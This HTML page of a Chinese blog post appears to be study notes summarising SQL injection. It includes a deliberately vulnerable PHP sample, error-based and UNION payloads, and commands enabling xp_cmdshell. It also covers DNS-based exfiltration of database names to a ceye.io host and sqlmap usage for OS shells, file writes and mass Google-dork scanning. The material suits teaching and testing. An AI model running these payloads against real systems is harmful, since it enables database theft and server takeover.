
<!DOCTYPE html>
<html lang="en">
    
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="han个人博客">
    <title>SQL 注入总结 - han个人博客</title>
    <meta name="author" content="han">
    
    
    
        <link rel="alternate" type="application/atom+xml" title="RSS" href="/atom.xml">
    
    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg"},"articleBody":"Abstract: SQL 注入总结，及note38-note40 笔记整理。\n\n\n\n\n\n\nSQL 注入原理当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，若对用户输入的参数没有经过严格的过滤处理，攻击者可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取或修改数据库中数据。\n\nSQL 注入漏洞本质：把用户输入的数据当作代码执行，违背了“数据与代码分离”的原则。\nSQL 注入漏洞有两个关键条件：\n用户能控制输入内容\nWeb 应用把用户输入的内容带入到数据库中执行\n\n\n\nSQL 注入分类\n二次编码原理提交的参数到 Web 服务器时，Web 服务器会自动解码一次，若某处使用了 urldecode 或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入。\n\n12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phperror_reporting(0);if(isset($_POST['id']))&#123;    echo $_POST['id'];    echo \"&lt;br&gt;\";    // debug 20190906 start    //$tmp = urldecode($_POST['id']);    //$tmp = addslashes($tmp);    // debug 20190906 end    $tmp = addslashes($_POST['id']);    echo \"before urldecode: \" . $tmp;    echo \"&lt;br&gt;\";    $tmp = urldecode($tmp);    echo \"POST DATA is: \" . $tmp;    echo \"&lt;br&gt;\";    $keyword = \"/(union select)|(order by)|(-- )|floor\\(\\)|updatexml\\(\\)|extractvalue\\(\\)|\\/\\*\\*\\/|(and 1=)/i\";    if(preg_match($keyword,$tmp))&#123;        show_source(__FILE__);        return ;    &#125;else&#123;        $id = $tmp;        $conn = @mysql_connect('localhost', 'root', 'root') or die('bad!');        mysql_query('set names utf8');        @mysql_select_db('test2', $conn) or die(\"error\");        $select_sql=\"SELECT * FROM users WHERE id='$id' limit 0,1\";        echo $select_sql;        echo \"&lt;br&gt;\";        $select_sql_result=mysql_query($select_sql,$conn);        $data=mysql_fetch_row($select_sql_result);        mysql_free_result($select_sql_result);        mysql_close($conn);        echo \"&lt;hr/&gt;&lt;br/&gt;&lt;p&gt;\";        print_r($data);        echo \"&lt;/p&gt;&lt;br/&gt;\";    &#125;&#125;else&#123;    show_source(__FILE__);    return ;&#125;?&gt;\n\n当 POST 的数据是 id=1%2527 时，数据发送到服务端会解码一次变为 id=1%27  ，由于没有敏感字符，经过 addslashes() 函数过滤后，还是 id=1%27，此时再经过 urldecode() 解码函数，数据为 id=1&#39; 带入到 SQL 语句如下：\n1SELECT * FROM users WHERE id=&apos;1&apos;&apos; limit 0, 1\n\n\n如把 urldecode() 函数和 addslashes() 函数交换位置，id=1%2527 经服务器解码后为 id=1%27 然后再经 urldecode() 函数解码为 id=1&#39; ，然后再由 addslashes() 后为 id=1\\&#39; ，可以看出来返回数据。\n\n二次注入原理在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者借助 get_magic_quotes_gpc 对其中的特殊字符进行转义，但是 addslashes 虽然参数在过滤后会添加 \\ 进行转义，但 \\ 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。\n在将数据存入到了数据库中之后，开发者认为数据是可信的，下次需要进行查询的时候，直接从数据库中取出脏数据，没有进行检验和处理，这样会造成 SQL 的二次注入。\n\n二次注入原理，主要分为两步：\n\n插入恶意数据\n第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身包含恶意内容。\n\n引用恶意数据\n将数据存入到数据库中后，开发者认为数据是可信的。下次需要查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验何处理。\n\n\n宽字节注入原理\n如何防止宽字节注入？\n\n使用 mysql_set_charset(&quot;GBK&quot;)\n使用 mysql_real_escape_string($id)\n\n\nHTTP 头注入HTTP 头部部分参数详解\n\n\n\n参数\n功能\n\n\n\nUser-Agent\n浏览器向服务器表名自己的身份，使得服务器能够识别客户使用的操作系统，浏览器版本\n\n\nCookie\n网站为了辨别用户身份，进行 session 跟踪而储存在用户本地终端上的数据\n\n\nX-Forwarded-For\n简称 XFF 头，它代表客户端，HTTP 请求端真是的 IP\n\n\nReferer\n浏览器向 Web 服务器表名自己从哪个页面链接过来的\n\n\nHost\n客户端指定自己想访问的 Web 服务器的域名/ IP 地址和端口号\n\n\n\n\n盲注步骤\n先用 count() 判断个数\n再用 length() 依次判断各个库名，表名，字段名的长度\n用 ascii() + substr() + if() 结合判断出每个字符\n\n外带查询原理\nMSSQL 下，可以利用自带的存储过程或创建自定义的存储过程，向外发送网络请求。并利用DNSlog 接收外传的数据。常用的函数有：\n\nxp_subdirs\nxp_dirtree\nxp_fileexist\nxp_cmdshell\n\n前三个存储过程的效果和使用方法几乎一致。\n123declare @a varchar(1024);set @a=db_name();exec(&apos;master..xp_dirtree &quot;//&apos; %2B @a %2B &apos;.o0k708.ceye.io/123&quot;&apos;)\n\nxp_cmdshell 要求必须为 DBA 权限下才可使用。\n1234sp_configure &apos;show advanced options&apos;,1;reconfigure;sp_configure &apos;xp_cmdshell&apos;,1;reconfigure;\n\n123declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)\n\nSQL 注入流程\n信息搜集\n获取数据\n移位溢注（使用ACCESS和MYSQL）可以在获取不了列名的情况下获取数据，但是要求后面的表个字段数小于前面表的字段数。\n偏移注入的步骤：\n\n判断注入点\norder by 判断长度\n判断表名\n联合查询\n获取表中列数\n开始偏移注入\n\n使用新方法注入：\n获取 admin 表的列数：\n用 order by 24 判断出字段长度\n12345678# 返回错误页面UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,* FROM admin# 返回错误页面UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,* FROM admin# 返回错误页面UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,* FROM admin# 返回正确页面，因此admin表列数为4UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,* FROM admin\n\n判断出页面那些位置能够显示数据，比如 13, 14 可以显示数据\n1UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,admin.*,17,18,19,20,21,22,23,24 FROM admin\n\nadmin 表的前两列能够显示\n1UNION SELECT 1,2,3,4,5,6,7,8,9,10,admin.*,15,1617,18,19,20,21,22,23,24 FROM admin\n\nadmin 表的后两列能够显示\n提权\nsqlmap –os-shell 原理--os-shell 流程\n\n命令行界面：\n\n--os-shell 需要的条件：\n\nFILE 权限\n可写的绝对路径\nPHP GPC OFF\n\n原理简述：通过 MySQL 的 into outfile 和 into dumpfile 向网站目录下写入 php 代码，用来执行系统命令。\nMySQL 注入常用函数\n\n\n函数名称\n函数功能\n\n函数名称\n函数功能\n\n\n\nsystem_user()\n系统用户名\n\nconcat()\n没有分隔符地连接字符串\n\n\nuser()\n用户名\n\nconcat_ws()\n含有分隔符地连接字符串\n\n\ncurrent_user()\n当前用户名\n\ngroup_concat()\n连接一个组所有字符串，并以逗号分隔每条数据\n\n\nsession_user()\n连接数据库的用户名\n\nload_file()\n读取本地文件\n\n\ndatabase()\n数据库名\n\ninto outfile()\n写文件\n\n\nversion()\n数据库版本\n\nascii()\n字符串的 ASCII 码值\n\n\n@@datadir\n数据库路径\n\nord()\n返回字符串第一个字符的 ASCII 值\n\n\n@@basedir\n数据库安装路径\n\nmid()/substr()\n返回一个字符串的一部分\n\n\n@@version_compile_os\n操作系统\n\nlength()\n返回字符串长度\n\n\ncount()\n返回执行结果数量\n\nsleep()\n让语句运行N秒钟\n\n\nleft()\n返回字符串最左边几个字符\n\nif()\n&gt; select if(1&gt;2,2,3);-&gt; 3\n\n\nfloor()\n返回小于或等于 x 的最大整数\n\nchar()\n返回 ASCII 代码组成的字符串\n\n\nextractvalue()\n用于报错注入\n\nupdatexml()\n用于报错注入\n\n\nstrcmp()\n比较字符串内容\n\nexp()\n返回 e 的 x 次方\n\n\n常用的报错注入语句如下：\n\nfloor()\n\n1and (select 1 from (select count(*),concat(user()/*存放要查询的 SQL 语句*/,floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n\nextractvalue()\n\n1and (extractvalue(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e)));\n\n\nupdatexml()\n\n1and (updatexml(1,concat(0x7e,(select user()/*存放要查询的 SQL 语句*/),0x7e),1));\n\nsqlmap 的使用指定 sqlmap 的探测技术--technique=TECH\n\nB: Boolean-based blind SQL injection\nE: Error-based SQL injection\nU: UNION query SQL injection\nS: Stacked queries SQL injection\nT: Time-based blind SQL injection\n\n指定注入参数1sqlmap -u \"url\" -p \"id, user-agent\"\n\n设置代理好处：\n1. 方便测试某些网站\n 2. 代理关联上 `burp` ，方便我们学习 `sqlmap` 发包规则1sqlmap -u \"url\" --proxy=\"http://127.0.0.1:8080\"\n\n设置好 burp ，可以在代理界面看到 sqlmap 发送的数据包。\n三种级别：详细程度/探测/风险\n详细程度：注入时 sqlmap 的界面显示的内容详细程度，级别程度为 0-6 ，默认为 1 ，指定参数用 -v 来表示。\n\n\n\n\n级别\n介绍\n\n\n\n0\n只显示 python 错误以及严重的信息\n\n\n1\n同时显示基本信息和警告信息\n\n\n2\n同时显示 debug 信息\n\n\n3\n同时显示注入的 payload\n\n\n4\n同时显示 HTTP 请求头\n\n\n5\n同时显示 HTTP 响应头\n\n\n6\n同时显示 HTTP 响应页面\n\n\n\n探测等级：指注入的 payload 语句的复杂程度，级别为 1-5，默认为 1 。\n\n1sqlmap -u \"url\" --level=LEVEL\n\n\n使用哪些 payload 也影响注入点的选择\nGET/POST 都会测试，level 2 时，会测试 cookie ，level 3 时，会测试 User-Agent 和 Referer。\n\n\n风险等级：指是否要使用具有不同级别风险的测试语句，级别为 1-3，默认为 1 。\n\n1sqlmap -u \"url\" --risk=RISK\n\n跳过某些参数\n跳过注入参宿\n\n使用很大的 level 等级，但有些参数并不需要测试，就可以使用 --skip 参数。\n1sqlmap -u \"url\" --skip=\"user-agent.referer\"\n\n\n跳过 URL 编码\n\n注入测试语句不经过 url 编码发送到服务器上。\n\n绕过 URL 重写规则\n\n有些时候 Web 服务器使用了 URL 重写，导致无法直接使用 sqlmap 测试参数，如 测试URL 这种格式的网址，在测试的参数后面加 *\n1sqlmap -u \"http://xxxx/info/1018*/2347.html\"\n\n闭合注入 Payload有些环境中，需要在注入的 payload 的前面或后面加一些字符来闭合符号，以保证 payload 的正常执行。\n如：\n12345&lt;?php        $query = \"SELECT * FROM users WHERE id=('\".$_GET['id'].\"') LIMIT 0,1\";    ?&gt;\n\n这时需要使用 --prefix 和 --suffix 参数，来进行闭合：\n1sqlmap -u \"http://192.168.100.111/sqlmap/mysql/get_str_brackets.php?id=1\" -p id --prefix \"')\" --suffix \"AND ('abc'='abc\"\n\n这样执行的 SQL 语句变成：\n12345&lt;?php    $query = \"SELECT * FROM users WHERE id=('1') &lt;PAYLOAD&gt; AND ('abc'='abc') LIMIT 0,1\";    ?&gt;\n\n绕过 WAF 设备--tamper=TAMPER，可以查看 tamper/ 目录下有哪些可用的脚本。\n结合 Burp 使用复制 burp 拦截的 HTTP 请求包，保存为 1.txt\n1sqlmap -r 'path/1.txt'\n\n批量扫描 burp 请求日志\n首先配置 burp 记录所有的 request 请求，并保存在指定文件夹\n\n\n\n接着浏览器设置 burp 代理，访问测试 url ，查看 sql.txt。\n\n\n3. 使用 `sqlmap` 扫描。1sqlmap -l sql.txt --batch --smart # batch 会自动选择 yes; smart 启动快速判断，节约时间\n\n批量扫描文本中的多个目标文本中保存 url 格式如下，sqlmap 会一个一个检测。\n\n1sqlmap -m url.txt\n\n利用正则过滤目标网址参数：--scope\n例如：只想要 www 开头，.com/.net/.org 结尾的网址\n1sqlmap -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\"\n\n利用谷歌批量扫1sqlmap -g \"inurl:\\\".php?id=1\\\"\"\n\n关于文件写入与 shell 获取123456789--sql-shell\t\t\t\t\t# 执行指定 sql 命令--sql-query\t\t\t\t\t# 执行指定的 sql 语句--file-read\t\t\t\t\t# 读取指定文件--file-write\t\t\t\t# 写入本地文件--file-write /test/test.txt --file-dest /var/www/html/1.txt # 将本地的test.txt文件写入目标的1.txt--file-dest\t\t\t\t\t# 要写入文件的绝对路径--os-cmd\t\t\t\t\t# 执行系统命令--os-shell\t\t\t\t\t# 系统交互shell--reg-read\t\t\t\t\t# 读取win系统注册表\n\nWAFWAF : Web 应用防护系统，主要是对 Web 特有入侵方式的加强防护。只能防御固有特征的漏洞，无法防御逻辑漏洞/ CSRF 漏洞/SSRF 漏洞\n![](/images/197WAF 分类.png)\nWAF 工作流程\n常见过 WAF技巧\n","dateCreated":"2019-09-07T17:22:04+08:00","dateModified":"2019-09-11T14:04:52+08:00","datePublished":"2019-09-07T17:22:04+08:00","description":"Abstract: SQL 注入总结，及note38-note40 笔记整理。","headline":"SQL 注入总结","image":["https://images.unsplash.com/photo-1567778025816-c6a70093d4f9?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=658&q=80"],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/07/sqlSum/"},"publisher":{"@type":"Organization","name":"han","sameAs":["https://github.com/","http://stackoverflow.com/users","mailto"],"image":"headimg.jpg","logo":{"@type":"ImageObject","url":"headimg.jpg"}},"url":"http://yoursite.com/2019/09/07/sqlSum/","keywords":"summary, SQL 注入","thumbnailUrl":"https://images.unsplash.com/photo-1567778025816-c6a70093d4f9?ixlib=rb-1.2.1&ixid=eyJhcHBfaWQiOjEyMDd9&auto=format&fit=crop&w=658&q=80"}</script>
    <meta name="description" content="Abstract: SQL 注入总结，及note38-note40 笔记整理。">
<meta name="keywords" content="summary,SQL 注入">
<meta property="og:type" content="blog">
<meta property="og:title" content="SQL 注入总结">
<meta property="og:url" content="http://yoursite.com/2019/09/07/sqlSum/index.html">
<meta property="og:site_name" content="han个人博客">
<meta property="og:description" content="Abstract: SQL 注入总结，及note38-note40 笔记整理。">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://yoursite.com/images/196SQLsum1.png">
<meta property="og:image" content="http://yoursite.com/images/196SQLsum5.png">
<meta property="og:image" content="http://yoursite.com/images/196SQLsum4.png">
<meta property="og:image" content="http://yoursite.com/images/196SQLsum3.png">
<meta property="og:image" content="http://yoursite.com/images/194secinjec.png">
<meta property="og:image" content="http://yoursite.com/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5.png">
<meta property="og:image" content="http://yoursite.com/images/197%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A51.png">
<meta property="og:image" content="http://yoursite.com/images/197User_Agent.png">
<meta property="og:image" content="http://yoursite.com/images/197XFF.png">
<meta property="og:image" content="http://yoursite.com/images/197DNS.png">
<meta property="og:image" content="http://yoursite.com/images/197SQL%E6%B3%A8%E5%85%A5.png">
<meta property="og:image" content="http://yoursite.com/images/197%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png">
<meta property="og:image" content="http://yoursite.com/images/197%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.png">
<meta property="og:image" content="http://yoursite.com/images/197%E6%8F%90%E6%9D%83.png">
<meta property="og:image" content="http://yoursite.com/images/os_shell.png">
<meta property="og:image" content="http://yoursite.com/images/os_shell.jpg">
<meta property="og:image" content="http://yoursite.com/images/197burp.png">
<meta property="og:image" content="http://yoursite.com/images/197sqltxt.png">
<meta property="og:image" content="http://yoursite.com/images/197sqlurltxt.png">
<meta property="og:image" content="http://yoursite.com/images/197WAF%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B.png">
<meta property="og:image" content="http://yoursite.com/images/197%E5%B8%B8%E8%A7%81%E8%BF%87WAF%E6%8A%80%E5%B7%A7.png">
<meta property="og:updated_time" content="2019-09-11T06:04:52.191Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="SQL 注入总结">
<meta name="twitter:description" content="Abstract: SQL 注入总结，及note38-note40 笔记整理。">
<meta name="twitter:image" content="http://yoursite.com/images/196SQLsum1.png">
    
    
        
    
    
        <meta property="og:image" content="http://yoursite.com/assets/images/headimg.jpg"/>
    
    
        <meta property="og:image" content="https://images.unsplash.com/photo-1567778025816-c6a70093d4f9?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=658&amp;q=80"/>
        <meta class="swiftype" name="image" data-type="enum" content="https://images.unsplash.com/photo-1567778025816-c6a70093d4f9?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=658&amp;q=80"/>
    
    
    
    <!--STYLES-->
    <link rel="stylesheet" href="/assets/css/style-apbcs1por3ly2xr25bjnwqewpfn9wrdfbucv3jdunxv2vrrgeivtgtwgojwn.min.css">
    <!--STYLES END-->
    

    

    
        
    
</head>

    <body>
        <div id="blog">
            <!-- Define author's picture -->


    
        
            
        
    

<header id="header" data-behavior="5">
    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
    <div class="header-title">
        <a
            class="header-title-link"
            href="/ "
            aria-label=""
        >
            han个人博客
        </a>
    </div>
    
        
            <a
                class="header-right-picture "
                href="#about"
                aria-label="Open the link: /#about"
            >
        
        
            <img class="header-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
        
        </a>
    
</header>

            <!-- Define author's picture -->



        
    

<nav id="sidebar" data-behavior="5">
    <div class="sidebar-container">
        
            <div class="sidebar-profile">
                <a
                    href="/#about"
                    aria-label="Read more about the author"
                >
                    <img class="sidebar-profile-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
                </a>
                <h4 class="sidebar-profile-name">han</h4>
                
                    <h5 class="sidebar-profile-bio"><p>life and code</p>
</h5>
                
            </div>
        
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/ "
                            
                            title="Home"
                        >
                    
                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Home</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-categories"
                            
                            title="Categories"
                        >
                    
                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Categories</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-tags"
                            
                            title="Tags"
                        >
                    
                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Tags</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/all-archives"
                            
                            title="Archives"
                        >
                    
                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Archives</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link open-algolia-search"
                             href="#search"
                            
                            title="Search"
                        >
                    
                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Search</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="#about"
                            
                            title="About"
                        >
                    
                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">About</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="https://github.com/" target="_blank" rel="noopener" title="GitHub">
                    
                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">GitHub</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link " href="http://stackoverflow.com/users" target="_blank" rel="noopener" title="Stack Overflow">
                    
                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Stack Overflow</span>
                    </a>
            </li>
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/mailto"
                            title="Mail"
                        >
                    
                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">Mail</span>
                    </a>
            </li>
            
        </ul>
        
            <ul class="sidebar-buttons">
            
                <li class="sidebar-button">
                    
                        <a  class="sidebar-button-link "
                             href="/atom.xml"
                            
                            title="RSS"
                        >
                    
                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
                        <span class="sidebar-button-desc">RSS</span>
                    </a>
            </li>
            
        </ul>
        
    </div>
</nav>

            
            <div id="main" data-behavior="5"
                 class="
                        hasCoverMetaIn
                        ">
                
<article class="post">
    
    
        <div class="post-header main-content-wrap text-center">
    
        <h1 class="post-title">
            SQL 注入总结
        </h1>
    
    
        <div class="post-meta">
    <time datetime="2019-09-07T17:22:04+08:00">
	
		    Sep 07, 2019
    	
    </time>
    
        <span>in </span>
        
    <a class="category-link" href="/categories/Web-Security/">Web Security</a>


    
</div>

    
</div>

    
    <div class="post-content markdown">
        <div class="main-content-wrap">
            <p><strong>Abstract</strong>: SQL 注入总结，及<code>note38-note40</code> 笔记整理。</p>
<a id="more"></a>

<!--export-->

<h1 id="table-of-contents">Table of Contents</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-注入原理"><span class="toc-text">SQL 注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-注入分类"><span class="toc-text">SQL 注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#二次编码原理"><span class="toc-text">二次编码原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#二次注入原理"><span class="toc-text">二次注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#宽字节注入原理"><span class="toc-text">宽字节注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP-头注入"><span class="toc-text">HTTP 头注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#盲注步骤"><span class="toc-text">盲注步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#外带查询原理"><span class="toc-text">外带查询原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-注入流程"><span class="toc-text">SQL 注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#信息搜集"><span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#获取数据"><span class="toc-text">获取数据</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#移位溢注（使用ACCESS和MYSQL）"><span class="toc-text">移位溢注（使用ACCESS和MYSQL）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#提权"><span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#sqlmap-–os-shell-原理"><span class="toc-text">sqlmap –os-shell 原理</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MySQL-注入常用函数"><span class="toc-text">MySQL 注入常用函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap-的使用"><span class="toc-text">sqlmap 的使用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#指定-sqlmap-的探测技术"><span class="toc-text">指定 sqlmap 的探测技术</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#指定注入参数"><span class="toc-text">指定注入参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#设置代理"><span class="toc-text">设置代理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#三种级别：详细程度-探测-风险"><span class="toc-text">三种级别：详细程度/探测/风险</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#跳过某些参数"><span class="toc-text">跳过某些参数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#闭合注入-Payload"><span class="toc-text">闭合注入 Payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#绕过-WAF-设备"><span class="toc-text">绕过 WAF 设备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#结合-Burp-使用"><span class="toc-text">结合 Burp 使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#批量扫描-burp-请求日志"><span class="toc-text">批量扫描 burp 请求日志</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#批量扫描文本中的多个目标"><span class="toc-text">批量扫描文本中的多个目标</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用正则过滤目标网址"><span class="toc-text">利用正则过滤目标网址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#利用谷歌批量扫"><span class="toc-text">利用谷歌批量扫</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#关于文件写入与-shell-获取"><span class="toc-text">关于文件写入与 shell 获取</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF"><span class="toc-text">WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#WAF-工作流程"><span class="toc-text">WAF 工作流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#常见过-WAF技巧"><span class="toc-text">常见过 WAF技巧</span></a></li></ol></li></ol>

<h3 id="SQL-注入原理"><a href="#SQL-注入原理" class="headerlink" title="SQL 注入原理"></a>SQL 注入原理</h3><p>当 Web 应用向后台数据库传递 SQL 语句进行数据库操作时，若对用户输入的参数没有经过严格的过滤处理，攻击者可以构造特殊 SQL 语句，直接输入数据库引擎执行，获取或修改数据库中数据。</p>
<ul>
<li>SQL 注入漏洞本质：把用户输入的数据当作代码执行，违背了“<strong>数据与代码分离</strong>”的原则。</li>
<li>SQL 注入漏洞有两个关键条件：<ul>
<li>用户能控制输入内容</li>
<li>Web 应用把用户输入的内容带入到数据库中执行</li>
</ul>
</li>
</ul>
<h3 id="SQL-注入分类"><a href="#SQL-注入分类" class="headerlink" title="SQL 注入分类"></a>SQL 注入分类</h3><p><img src="/images/196SQLsum1.png" alt></p>
<h4 id="二次编码原理"><a href="#二次编码原理" class="headerlink" title="二次编码原理"></a>二次编码原理</h4><p>提交的参数到 Web 服务器时，Web 服务器会自动解码一次，若某处使用了 urldecode 或者 rawurldecode 函数，则会导致二次解码生成单引号引发注入。</p>
<p><img src="/images/196SQLsum5.png" alt></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">'id'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="comment">// debug 20190906 start</span></span><br><span class="line">    <span class="comment">//$tmp = urldecode($_POST['id']);</span></span><br><span class="line">    <span class="comment">//$tmp = addslashes($tmp);</span></span><br><span class="line">    <span class="comment">// debug 20190906 end</span></span><br><span class="line">    $tmp = addslashes($_POST[<span class="string">'id'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"before urldecode: "</span> . $tmp;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $tmp = urldecode($tmp);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"POST DATA is: "</span> . $tmp;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $keyword = <span class="string">"/(union select)|(order by)|(-- )|floor\(\)|updatexml\(\)|extractvalue\(\)|\/\*\*\/|(and 1=)/i"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match($keyword,$tmp))&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $id = $tmp;</span><br><span class="line">        $conn = @mysql_connect(<span class="string">'localhost'</span>, <span class="string">'root'</span>, <span 